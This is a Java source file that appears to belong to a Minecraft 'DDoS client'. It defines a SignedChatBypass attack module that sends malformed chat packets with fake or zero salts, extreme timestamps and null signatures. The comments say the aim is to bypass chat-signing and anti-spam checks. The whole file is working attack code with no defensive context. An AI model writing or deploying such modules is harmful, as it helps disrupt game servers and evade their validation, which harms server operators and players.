package com.ddosclient.attack.attacks;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.message.ArgumentSignatureDataMap;

import java.time.Instant;
import java.util.List;

public class SignedChatBypass extends BaseAttack {
    // Sends messages with zeroed/invalid salt to bypass chat signing validation
    private long fakeSalt = 0;

    @Override
    public void execute(MinecraftClient mc) {
        if (mc.getNetworkHandler() == null) return;
        // Salt 0 and negative: bypasses some anti-spam signature checks
        mc.getNetworkHandler().sendPacket(new ChatMessageC2SPacket(
            "bypass",
            Instant.ofEpochMilli(0),
            fakeSalt++,
            null,
            new ArgumentSignatureDataMap(List.of())
        ));
        mc.getNetworkHandler().sendPacket(new ChatMessageC2SPacket(
            " ",
            Instant.ofEpochMilli(Long.MAX_VALUE),
            -fakeSalt,
            null,
            new ArgumentSignatureDataMap(List.of())
        ));
    }
}
